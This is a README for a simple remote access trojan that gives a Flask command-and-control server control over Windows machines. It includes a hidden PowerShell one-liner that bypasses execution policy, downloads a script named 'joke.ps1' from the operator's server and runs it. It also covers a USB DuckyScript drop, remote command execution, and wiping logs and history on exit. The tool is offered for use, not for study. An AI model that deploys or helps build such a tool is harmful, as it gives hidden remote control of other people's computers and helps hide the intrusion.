# random rat shit

This is a dead simple C2 for Windows boxes. You run a server, drop a PS1 payload, get a shell. No encryption, no bullshit.

## What you need
- Python 3 (with flask)
- A Windows target with PowerShell
- A server to host it (your own machine, VPS, whatever)

## Setup

### 1. Generate keys
Run this twice and save both:
```
python -c "import secrets; print(secrets.token_urlsafe(32))"
```
- First one = API_KEY (for sending commands)
- Second one = LISTENER_SECRET (for the listener)

### 2. Edit the files
Replace these in all files:
- `SECRET_API_KEY` → your first key
- `SECRET_LISTENER_TOKEN` → your second key
- `yourserver` → your actual IP (like 192.168.1.100)

Files to edit:
- `c2.py`
- `controller.py`
- `joke.ps1`
- `payload.txt`

### 3. Run the server
```
pip install flask
python c2.py
```
That's it. It's on port 6969.

### 4. Put joke.ps1 in the same folder
The server serves it at `http://yourserver:6969/joke.ps1`.

### 5. Drop the payload on target
From a cmd or Run:
```
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoP -Win Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('http://yourserver:6969/joke.ps1') | iex"
```

Or use the DuckyScript in `payload.txt` – just flash it after editing the IP.

### 6. Control it
```
pip install requests
python controller.py send "whoami"
python controller.py list
python controller.py result <command_id>
```

## How it works
- Listener polls `/api/poll` every 2s.
- You send commands via `/api/command`.
- It runs them and posts results to `/api/result`.
- Self‑cleans logs, history, temp on exit.

## Notes
- No SSL – keep it on LAN or use a tunnel.
- All secrets in plaintext – don't leak them.
- Send `exit` or `quit` to kill the listener cleanly.
